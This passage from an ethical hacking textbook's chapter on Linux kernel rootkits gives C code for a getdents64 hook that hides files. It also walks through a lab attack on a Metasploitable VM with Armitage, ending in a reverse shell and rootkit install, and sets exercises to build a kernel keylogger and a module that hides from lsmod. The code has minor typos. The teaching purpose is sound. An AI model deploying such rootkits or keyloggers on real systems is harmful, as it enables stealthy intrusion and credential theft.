		<p class="indent">If you installed the module correctly, you’ll notice that the Kali Linux kernel still responds to the pings, indicating that it is still up and running. When this module is running, a victim would have to hit the power switch or unplug the machine to completely shut it down.</p>
		<h3 class="h3" id="ch11lev9"><strong>Hiding Files</strong></h3>
		<p class="noindent">Rootkits can also hide files by hooking the “get directory entries” system call (<span class="literal">__NR_getdents64</span>), which runs the <span class="literal">getdents()</span> kernel function:</p>
		<p class="programs">long getdents64(<br/>
                  unsigned int fd,<br/>
                  struct linux_dirent64 *dirp,<br/>
                  unsigned int count<br/>
             );</p>
		<p class="indent">As you can see, the <span class="literal">getdents()</span> function takes three parameters as input. The first parameter is the file ID returned by the <span class="literal">open</span> syscall, which is an integer that uniquely identifies a file or directory. The second parameter is a pointer to an array of Linux directory entries (<span class="literal">linux_dirent</span>). The third parameter is the number of entries in that array.</p>
		<h4 class="h4" id="ch11lev10"><strong><em>The linux_dirent struct</em></strong></h4>
		<p class="noindent">Let’s take a look at the structure of entries in the <span class="literal">linux_dirent</span> array. These entries are important because they’re what is displayed in your file explorer <span epub:type="pagebreak" id="page_235"/>or whenever you run the <span class="literal">ls</span> command. Removing an entry from this list will remove it from all programs that use the <span class="literal">dirent64</span> syscall to display files:</p>
		<p class="programs">struct linux_dirent64 {<br/>
            ino64_t        d_ino;<br/>
            off64_t        d_off;<br/>
            unsigned short d_reclen;<br/>
            unsigned char  d_type;<br/>
            char           d_name[];<br/>
        };</p>
		<p class="indent">The <span class="literal">d_ino</span> field is an 8-byte field containing a unique number that identifies the <em>inode</em> associated with a file. Inodes are data structures the Linux filesystem uses to store metadata such as file size and timestamp. Inodes also include pointers to the place where the file is stored in memory. The second field is the 8-byte file offset, which specifies the number of bytes until the next entry in the array. The next field, <span class="literal">d_reclen</span>, represents the total length of the entry. The 1-byte <span class="literal">d_type</span> field is used to distinguish the entry’s type as both files and directories are valid entries in the <span class="literal">linux_dirent</span> array. The final field, <span class="literal">d_name[]</span>, contains the file or directory name.</p>
		<h4 class="h4" id="ch11lev11"><strong><em>Writing the Hooking Code</em></strong></h4>
		<p class="noindent">Hooking the syscall associated with the <span class="literal">getdents64()</span> function allows us to run our malicious function when that syscall is called. Our function will call the original <span class="literal">getdents64()</span> function; however, we’ll remove entries containing our malicious files’ names from the array of Linux directory entries before returning from the call. More specifically, any entries that start with the prefix <span class="literal">eh_hacker_</span> will be removed, making it seem as though they never existed.</p>
		<p class="indent">To visualize the work we’ll have to do, take a look at <a href="ch11.xhtml#ch11fig5">Figure 11-5</a>, which shows how we’ll modify the array containing directory entries. In this example, the shaded entry is a file containing the <span class="literal">eh_hacker_</span> prefix.</p>
		<div class="image" id="ch11fig5">
			<img alt="image" src="../images/ch11fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-5: How the directory entry array is modified</em></p>
		<p class="indent">As soon as we’ve discovered a file with the <span class="literal">eh_hacker_</span> prefix, we remove it from the array, overriding it by moving the subsequent value up. In this example, we overwrite 3 by moving 4 and 5 up next to 2. Lastly, we update <span epub:type="pagebreak" id="page_236"/>the length of the array from 5 to 4. The following code implements the malicious <span class="literal">hacker_getdents64()</span> function:</p>
		<p class="programs">#define PREFIX "eh_hacker_"<br/>
#define PREFIX_LEN 10<br/>asmlinkage hacker_getdents64( unsigned int fd, struct linux_dirent64 *dirp,<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 unsigned int count){<br/><span class="ent">➊</span> int num_bytes = old_getdents64(fd,dirp, count);<br/>
   struct linux_dirent64* entry = NULL;<br/>
   int offset = 0;<br/><span class="ent">➋</span> while( offset &lt; num_bytes){<br/>
       unsigned long entry_addr = drip + offset;<br/>
       entry = (struct linux_dirent*) entry_addr;<br/>
    <span class="ent">➌</span> if (strncmp(entry-&gt;d_name, PREFIX, PREFIX_LEN) != 0){<br/>
               offset += entry-&gt;d_reclen;<br/>
        }else{<br/>
          <span class="ent">➍</span> size_t bytes_remaining = num_bytes - (offset + entry-&gt;d_reclen);<br/>
             memcpy(entry_addr, entry_addr + entry-&gt;d_reclen, bytes_remaining);<br/>
             num_bytes -= entry-&gt;d_reclen;<br/>
             count -= 1;<br/>
        }<br/>
    }<br/>
    return num_bytes;<br/>
}</p>
		<p class="indent">We call the kernel’s original <span class="literal">getdent64()</span> function <span class="ent">➊</span>, which updates the pointer to point to the Linux directory entries array and set the count to the number of entries. It will also return the number of bytes in the array. Next, we loop through all the entries <span class="ent">➋</span> and increment the offset until we get to the last byte in the byte array. During each iteration of the loop, we calculate an entry’s address by adding the offset’s value to the directory entries pointer (<span class="literal">drip</span>). Then we cast the address to be a pointer to the <span class="literal">linux_direct</span> struct so that we can easily access its fields. Next, we check the filename entry to see whether it starts with our prefix (<span class="literal">eh_hacker_</span>) <span class="ent">➌</span>. If it doesn’t match, we skip it by advancing the offset to the next entry. However, if it does contain our prefix, we calculate the number of remaining bytes <span class="ent">➍</span> and then override the entry by sliding the remaining bytes back, as shown in <a href="ch11.xhtml#ch11fig5">Figure 11-5</a>. Lastly, we decrement the count and the number of bytes.</p>
		<p class="indent">In addition to hiding files, sophisticated rootkits, such as the one in the Drovorub malware, also hide processes, sockets, and packets. These activities help the malware avoid detection. For example, hiding packets enables the rootkit to avoid detection while communicating with an attacker’s server. It can hide packets by hooking into the Netfilter component, a part of the Linux kernel that allows firewalls to block and filter packets.</p>
		<h3 class="h3" id="ch11lev12"><span epub:type="pagebreak" id="page_237"/><strong>Using Armitage to Exploit a Host and Install a Rootkit</strong></h3>
		<p class="noindent">Now that you’ve seen how kernel module base rootkits work, let’s use a tool called <em>Armitage</em> to execute an attack from start to finish. We’ll begin by scanning the Metasploitable virtual machine to identify a vulnerability. Then we’ll exploit that vulnerability to upload a reverse shell, which we’ll use to download and install a rootkit.</p>
		<p class="indent">Armitage is a GUI that simplifies interfacing with the Metasploit Framework. The commercial version of this software is called Cobalt Strike, and it costs approximately $3,500. Luckily, Armitage is free, though it can be buggy. Install it by running the following:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo apt-get install armitage</span></p>
		<p class="indent">Once the installation is complete, start the <span class="literal">postgresql</span> database service, which the Metasploit Framework uses to store information about client connections:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo service postgresql start</span></p>
		<p class="indent">Armitage is a GUI interface for the Metasploit Framework, so you must ensure that Metasploit is running before launching Armitage. After the database has been initialized, start Metasploit by running the following:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo msfdb init</span><br/>
[i] Database already started<br/>
[+] Creating database user 'msf'<br/>
[+] Creating databases 'msf'<br/>
[+] Creating databases 'msf_test'</p>
		<p class="indent">Now launch Armitage:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo armitage &amp;</span></p>
		<p class="indent">The first time you run this command, it should take a minute to load, so be patient. When it finishes, you should see a setup screen like that in <a href="ch11.xhtml#ch11fig6">Figure 11-6</a>. Use all the default options and click <strong>Connect</strong> to use a local Metasploitable server.</p>
		<div class="image" id="ch11fig6">
			<img alt="image" src="../images/ch11fig06.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-6: The Armitage setup screen</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_238"/>Click <strong>Yes</strong> to start Metasploit’s remote procedure call (RPC) server, which allows you to use Armitage to programmatically control the Metasploit Framework.</p>
		<h4 class="h4" id="ch11lev13"><strong><em>Scanning the Network</em></strong></h4>
		<p class="noindent">Let’s start by using the Armitage discovery tool to find the machines in your virtual environment. Click <strong>Hosts</strong> ▶ <strong>Scan</strong> ▶ <strong>Quick Scan OS Detect</strong>, as shown in <a href="ch11.xhtml#ch11fig7">Figure 11-7</a>. The <strong>Quick Scan OS Detect</strong> option will perform a quick <span class="literal">nmap</span> scan of the virtual environment.</p>
		<div class="image" id="ch11fig7">
			<img alt="image" src="../images/ch11fig07.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-7: An example of running the quick scan</em></p>
		<p class="indent">You should see a pop-up that asks you for the range of IP addresses you want to scan. This pop-up takes an address in CIDR notation (for example, 192.168.1.0/24; see <a href="ch02.xhtml#ch2">Chapter 2</a> for a discussion of CIDR).</p>
		<p class="indent">Once you’ve discovered some hosts, scan them for vulnerabilities by clicking the host and selecting <strong>Attacks</strong> ▶ <strong>Find Attacks</strong> (<a href="ch11.xhtml#ch11fig8">Figure 11-8</a>).</p>
		<div class="image" id="ch11fig8">
			<img alt="image" src="../images/ch11fig08.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-8: Using Armitage to quickly scan all addresses</em></p>
		<p class="indent">When the vulnerability scan has completed, click the host and select <strong>Attack</strong>. You should see a list of available attacks. The Metasploit Framework <span epub:type="pagebreak" id="page_239"/>has a built-in scanner, similar to those discussed in <a href="ch08.xhtml#ch8">Chapter 8</a>, that locates possible vulnerabilities. The vulnerability scanner will discover the FTP vulnerability we discussed in <a href="ch01.xhtml#ch1">Chapter 1</a>. <a href="ch11.xhtml#ch11fig9">Figure 11-9</a> shows the FTP attack.</p>
		<div class="image" id="ch11fig9">
			<img alt="image" src="../images/ch11fig09.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-9: The vftpd vulnerability</em></p>
		<p class="indent">Alternatively, you can use the search box on the left to search the hosts for a specific exploit.</p>
		<h4 class="h4" id="ch11lev14"><strong><em>Exploiting a Host</em></strong></h4>
		<p class="noindent">When Armitage attacks a host, it uploads a payload to the host. Thus, you must configure the payload so that it knows how to connect to your machine. <a href="ch11.xhtml#ch11fig10">Figure 11-10</a> shows the configuration screen.</p>
		<div class="image" id="ch11fig10">
			<img alt="image" src="../images/ch11fig10.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-10: Description of the attack</em></p>
		<p class="indent">You may have noticed that these options look very similar to the Metasploit Framework options used in <a href="ch10.xhtml#ch10">Chapter 10</a>. This is because Armitage is a GUI wrapper for Metasploit. LHOST is the IP address of the controlling machine, and LPORT is the port on the controlling machine. Similarly, RHOST is the IP address of the host you’re attacking, and RPORT is the port used by the reverse shell included in the payload uploaded to the host. <span epub:type="pagebreak" id="page_240"/>Click <strong>Use a reverse connection</strong> option to instruct Armitage to generate a reverse shell similar to the one we implemented in <a href="ch04.xhtml#ch4">Chapter 4</a> and then click <strong>Launch</strong> to launch the attack.</p>
		<p class="indent">Once your host is compromised, the host’s icon in the Armitage GUI will change. To access the machine’s shell, right-click the host and then select <strong>Shell</strong> ▶ <strong>Interact</strong>, as shown in <a href="ch11.xhtml#ch11fig11">Figure 11-11</a>. A Linux shell should appear in the bottom of the window.</p>
		<div class="image" id="ch11fig11">
			<img alt="image" src="../images/ch11fig11.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-11: Getting shell access in Armitage</em></p>
		<h4 class="h4" id="ch11lev15"><strong><em>Installing a Rootkit</em></strong></h4>
		<p class="noindent">Now that you have access, use the shell associated with the payload to download and install a rootkit on the host. You can find a long list of open source rootkits that contains rootkits for Android, Linux, Windows, and macOS systems at <em><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Rootkits.md">https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Rootkits.md</a></em>.</p>
		<h3 class="h3" id="ch11lev16"><strong>Exercises</strong></h3>
		<p class="noindent">Complete these exercises to practice creating kernel modules. In the first exercise, you’ll write a kernel module called a <em>keylogger</em> that logs everything a user types, including usernames and passwords. In the second exercise, you’ll extend your module so that it hides from the <span class="literal">lsmod</span> command.</p>
		<h4 class="h4" id="ch11lev17"><strong><em>The Keylogger</em></strong></h4>
		<p class="noindent">Keyloggers are common hacking tools, and implementing one in the kernel offers an extra advantage: it allows you to stealthily intercept all of a user’s keystrokes, regardless of which application they’re using.</p>
		<p class="indent">As you did earlier in this chapter, create a new folder for your module named <em>keylogger_module</em> and create two files, <em>keylogger.c</em> and <em>Makefile</em>. In the module file, first define a mapping array, which maps numeric keycodes (unique numbers assigned to each key on the keyboard) to characters:</p>
		<p class="programs"><span class="codestrong1">static const char</span>* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7"<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 , "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",<br/>
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[",<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",<br/>
                        <span epub:type="pagebreak" id="page_241"/>"g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\"<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 , "z", "x", "c", "v", "b", "n", "m", ",", "."};</p>
		<p class="indent">A fun, interactive way to see the mapping is to open a terminal, run the <span class="literal"><strong>showkey</strong></span> command, open another application like Mousepad, and start typing. The <span class="literal">showkey</span> command should display the key code of each key you press:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo showkey --keycode</span><br/>press any key (program terminates 10s after last keypress)...<br/>keycode  28 release<br/>keycode   2 press<br/>keycode   2 release<br/>keycode  35 press<br/>keycode  35 release<br/>keycode  48 press<br/>keycode  48 release</p>
		<p class="indent">You may have already noticed that the values are roughly in the order of a “qwerty” keyboard layout. Because actual keyboard layouts vary by region and preference, the keymap translates keycodes to specific ASCII characters. Put this keymap definition at the top of your <em>keylogger.c</em> file.</p>
		<p class="indent">The <span class="literal">__init</span> and <span class="literal">__exit</span> methods in this module are very short. They simply register and unregister, respectively, a keyboard <span class="literal">notifier_block</span> struct. You may have also noticed that the <span class="literal">__init</span> and <span class="literal">__exit</span> methods in this module have different names than the module we created in this chapter; that is, <span class="literal">start</span> and <span class="literal">end</span> rather than <span class="literal">startup</span> and <span class="literal">shutdown</span>—these names are arbitrary:</p>
		<p class="programs">static int __init start(void)<br/>
{<br/>
   register_keyboard_notifier(&amp;nb);<br/>
   printk(KERN_INFO "Keyboard Module Loaded!\n");<br/>
   return 0;<br/>
}<br/>static void __exit end(void)<br/>
{<br/>
   unregister_keyboard_notifier(&amp;nb);<br/>
   printk(KERN_INFO "Module Unloaded!\n");<br/>
}</p>
		<p class="indent">Next, to be notified when a user presses a key, we must specify a value for one of the attributes of the keyboard <span class="literal">notifier_block</span> struct. This struct is an API mechanism provided by the kernel that gives a module access to some keyboard functionality. We define it at the top of our module here:</p>
		<p class="programs">static struct notifier_block nb = {<br/>
 <span class="ent">➊</span>.notifier_call =  <span class="ent">➋</span> notify_keypress<br/>
};</p>
		<p class="indent"><span epub:type="pagebreak" id="page_242"/>Specifying values for predefined structs, as we’ve done here, is a common pattern when programming in the Linux kernel. If you take a look at the complete <span class="literal">notifier_block</span> struct definition in the Linux <em>notifier.h</em> source file, you’ll notice that it specifies many more attributes than are shown in our definition of it. However, they’re all set to <span class="literal">NULL</span> until a module (like ours) sets their values. Here, we’ve specified a value for the <span class="literal">notifier_call</span> attribute <span class="ent">➊</span> by providing a function pointer <span class="literal">notify_keypress</span> <span class="ent">➋</span>. Now our function will be called whenever a user presses a key.</p>
		<p class="indent">Complete the implementation of the <span class="literal">notify_keypress</span> function so that it logs user key presses:</p>
		<p class="programs">int notify_keypress(struct notifier_block *nb, unsigned long code, void<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 *_param)<br/>
{<br/>
 <span class="ent">➊</span> struct keyboard_notifier_param *param;<br/>
    param = _param;<br/>
    if(code == KBD_KEYCODE)<br/>
    {<br/>
       if(param-&gt;down)<br/>
       {<br/>
        /*-----------------------*/<br/>
        /* Place your code here */<br/>
        /*----------------------*/<br/>
       }<br/>
    }<br/>
    return NOTIFY_OK;<br/>
}</p>
		<p class="indent">The <span class="literal">keyboard_notifier_param</span> struct <span class="ent">➊</span> contains details on the key press events. The source code from the <span class="literal">keyboard_notifier_param</span> struct is available in the <em>keyboard.h</em> file in the Linux source code. I’ve included a snippet of the file for your convenience; you can see all values in the struct associated with a key press event:</p>
		<p class="programs">struct keyboard_notifier_param {<br/>
   struct vc_data *vc;<br/>
 <span class="ent">➊</span> int down;<br/>
    int shift;<br/>
    int ledstate;<br/>
 <span class="ent">➋</span> unsigned int value;<br/>
};</p>
		<p class="indent">We use these details to determine when a <span class="literal">keydown</span> event <span class="ent">➊</span> occurs and extract its <span class="literal">keycode</span> <span class="ent">➋</span>. This keycode becomes an index for our keymap. You can read other details from this struct, as well, including the SHIFT key state and keyboard LED state. Try implementing functionality that adds the character a user types to the kernel ring buffer.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_243"/>This module dumps key presses to the kernel’s logs. However, a more sophisticated logger could transmit key presses to a hacker’s machine, where the hacker could extract credentials.</p>
		<h4 class="h4" id="ch11lev18"><strong><em>Self-Hiding Module</em></strong></h4>
		<p class="noindent">Extend the kernel module so that it hides from the <span class="literal">lsmod</span> command as soon as you install it. I’ll leave this implementation completely up to you. A great place to start is by looking at kernel modules that other developers have created. For instance, Reptile is a well-documented Linux kernel module rootkit. Take a look at its <em>module.c</em> file at <em><a href="https://github.com/f0rb1dd3n/Reptile/blob/master/kernel/module.c">https://github.com/f0rb1dd3n/Reptile/blob/master/kernel/module.c</a></em>.<span epub:type="pagebreak" id="page_244"/></p>
	</body>
</html>